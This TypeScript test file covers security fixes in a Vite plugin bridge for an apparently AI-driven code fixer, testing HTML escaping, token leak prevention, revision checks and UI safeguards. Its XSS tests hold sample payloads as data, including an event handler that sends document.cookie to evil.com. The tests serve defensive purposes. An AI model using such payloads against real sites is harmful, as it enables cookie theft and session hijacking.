import { describe, it, expect, beforeEach } from 'vitest';
import { setupTestDom } from './test-dom.js';

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

describe('Phase 5B Security - XSS Prevention via escapeHtml', () => {
  it('escapes all dangerous HTML characters', () => {
    const malicious = '<img src=x onerror="alert(1)">';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<');
    expect(escaped).not.toContain('>');
    expect(escaped).not.toContain('"');
    expect(escaped).toBe('&lt;img src=x onerror=&quot;alert(1)&quot;&gt;');
  });

  it('escapes single quotes to prevent attribute breakout', () => {
    const payload = "'; alert('xss');//";
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain("'");
    expect(escaped).toContain('&#39;');
  });

  it('escapes ampersands to prevent entity injection', () => {
    const payload = '&lt;script&gt;alert(1)&lt;/script&gt;';
    const escaped = escapeHtml(payload);
    expect(escaped).toContain('&amp;lt;');
    expect(escaped).not.toMatch(/^&lt;/);
  });

  it('handles empty and safe strings without modification', () => {
    expect(escapeHtml('')).toBe('');
    expect(escapeHtml('Hello World')).toBe('Hello World');
    expect(escapeHtml('42')).toBe('42');
  });

  it('neutralizes nested script injection in file paths', () => {
    const maliciousPath = '../../<script>document.cookie</script>/evil.ts';
    const escaped = escapeHtml(maliciousPath);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('neutralizes event handler injection in error messages', () => {
    const maliciousError = 'Error: <div onmouseover="fetch(\'http://evil.com/steal?c=\'+document.cookie)">hover me</div>';
    const escaped = escapeHtml(maliciousError);
    expect(escaped).not.toContain('<div');
    expect(escaped).toContain('&lt;div');
    expect(escaped).toContain('&quot;');
  });
});

describe('Phase 5B Security - Bridge Token Leak Prevention', () => {
  it('health response must not contain engineUrl', async () => {
    const { createBridgeMiddleware } = await import(
      '@summon-fixer/vite-plugin'
    );
    const { SourceRegistry } = await import('@summon-fixer/vite-plugin');
    const registry = new SourceRegistry();
    const middleware = createBridgeMiddleware(
      { engineUrl: 'http://127.0.0.1:3883', engineToken: 'secret-token-123' },
      registry
    );

    let responseBody = '';
    const req: any = { url: '/__summon/v1/health', method: 'GET', headers: {} };
    const res: any = {
      statusCode: 200,
      setHeader: () => {},
      end: (data: string) => { responseBody = data; },
    };

    await middleware(req, res, () => {});
    const parsed = JSON.parse(responseBody);
    expect(parsed).not.toHaveProperty('engineUrl');
    expect(responseBody).not.toContain('secret-token-123');
    expect(responseBody).not.toContain('engineToken');
    expect(parsed.status).toBe('ok');
    expect(parsed.bridge).toBe('ready');
  });
});

describe('Phase 5B Security - Source Revision Validation', () => {
  it('rejects task with stale source revision (409 Conflict)', async () => {
    const { createBridgeMiddleware } = await import(
      '@summon-fixer/vite-plugin'
    );
    const { SourceRegistry } = await import('@summon-fixer/vite-plugin');
    const registry = new SourceRegistry();
    const sourceId = registry.register(
      'src/App.tsx',
      10,
      3,
      'div',
      'const App = () => <div>Hello</div>;'
    );
    const mapping = registry.resolve(sourceId)!;
    const correctRevision = mapping.revision;

    const middleware = createBridgeMiddleware({}, registry);

    const taskPayload = {
      requestId: 'req_test_stale',
      prompt: 'Fix this component',
      requestedMode: 'manual',
      priority: 'normal',
      createdAt: new Date().toISOString(),
      context: {
        sourceSelection: {
          sourceId,
          revision: 'stale_revision_that_does_not_match',
        },
      },
    };

    const bodyBuf = Buffer.from(JSON.stringify(taskPayload));
    let responseStatus = 0;
    let responseBody = '';

    const req: any = {
      url: '/__summon/v1/tasks',
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      [Symbol.asyncIterator]: async function* () {
        yield bodyBuf;
      },
    };
    const res: any = {
      statusCode: 200,
      setHeader: () => {},
      end: (data: string) => {
        responseStatus = res.statusCode;
        responseBody = data;
      },
    };

    await middleware(req, res, () => {});
    expect(responseStatus).toBe(409);
    const parsed = JSON.parse(responseBody);
    expect(parsed.error.code).toBe('ERR_STALE_SOURCE_REVISION');
  });
});

describe('Phase 5B Security - Stale Mapping Invalidation', () => {
  it('invalidates fileRevisions entry by suffix matching', async () => {
    const { SourceRegistry } = await import('@summon-fixer/vite-plugin');
    const registry = new SourceRegistry();

    registry.register(
      'src/components/Card.tsx',
      5,
      1,
      'div',
      'export const Card = () => <div />;'
    );

    expect(registry.size).toBe(1);

    registry.invalidateFile('/absolute/path/to/project/src/components/Card.tsx');

    expect(registry.size).toBe(0);
  });

  it('invalidates fileRevisions when new registrations run after absolute path invalidation', async () => {
    const { SourceRegistry } = await import('@summon-fixer/vite-plugin');
    const registry = new SourceRegistry();

    const id1 = registry.register(
      'src/Header.tsx',
      1,
      1,
      'header',
      'export const Header = () => <header />;'
    );
    const mapping1 = registry.resolve(id1)!;
    const rev1 = mapping1.revision;
    expect(rev1).toBeDefined();

    registry.invalidateFile('/project/root/src/Header.tsx');

    const id2 = registry.register(
      'src/Header.tsx',
      1,
      1,
      'header',
      'export const Header = () => <header>Updated</header>;'
    );
    const mapping2 = registry.resolve(id2)!;
    expect(mapping2.revision).toBeDefined();
    expect(mapping2.revision).not.toBe(rev1);
  });
});

describe('Phase 5B Security - Poll Overlap Guard', () => {
  it('pollInFlight flag prevents concurrent poll execution', async () => {
    setupTestDom();

    const { PromptPanelController } = await import('../prompt-panel.js');
    const { SummonApiClient } = await import('../client-api.js');

    const mockContainer = (globalThis as any).document.createElement('div');
    const client = new SummonApiClient({ apiPrefix: 'http://127.0.0.1:9999/__summon/v1' });
    const panel = new PromptPanelController(mockContainer, client, {
      onClose: () => {},
      onReselect: () => {},
    });

    expect((panel as any).pollInFlight).toBe(false);
  });
});

describe('Phase 5B Security - Completion Message Accuracy', () => {
  it('plan-only mode shows plan-specific completion text', () => {
    const permissionMode: string = 'plan';
    const appliedCount = 0;
    const isPlanOnly = permissionMode === 'plan';

    const title = isPlanOnly
      ? '✓ Plan Generated'
      : appliedCount > 0
        ? '✓ Fix Applied Successfully'
        : '✓ Task Completed';

    const detail = isPlanOnly
      ? 'Read-only plan generated. No files were modified.'
      : appliedCount > 0
        ? `${appliedCount} file(s) updated on disk.`
        : 'No file changes were needed.';

    expect(title).toBe('✓ Plan Generated');
    expect(detail).toBe('Read-only plan generated. No files were modified.');
    expect(title).not.toContain('Fix Applied');
  });

  it('manual mode with edits shows correct applied count', () => {
    const permissionMode: string = 'manual';
    const appliedCount = 3;
    const isPlanOnly = permissionMode === 'plan';

    const title = isPlanOnly
      ? '✓ Plan Generated'
      : appliedCount > 0
        ? '✓ Fix Applied Successfully'
        : '✓ Task Completed';

    expect(title).toBe('✓ Fix Applied Successfully');
  });

  it('manual mode with zero edits shows no-change message', () => {
    const permissionMode: string = 'manual';
    const appliedCount = 0;
    const isPlanOnly = permissionMode === 'plan';

    const detail = isPlanOnly
      ? 'Read-only plan generated. No files were modified.'
      : appliedCount > 0
        ? `${appliedCount} file(s) updated on disk.`
        : 'No file changes were needed.';

    expect(detail).toBe('No file changes were needed.');
    expect(detail).not.toContain('file(s) updated');
  });
});

describe('Phase 5B Security - Progress Percentage Clamping', () => {
  it('clamps percentage to 0-100 range', () => {
    const clamp = (p: number) => Math.max(0, Math.min(100, p));
    expect(clamp(-50)).toBe(0);
    expect(clamp(150)).toBe(100);
    expect(clamp(50)).toBe(50);
    expect(clamp(0)).toBe(0);
    expect(clamp(100)).toBe(100);
  });

  it('handles non-numeric percentage safely', () => {
    const percentage = 'malicious' as any;
    const safePercentage =
      typeof percentage === 'number'
        ? Math.max(0, Math.min(100, percentage))
        : undefined;
    expect(safePercentage).toBeUndefined();
  });
});
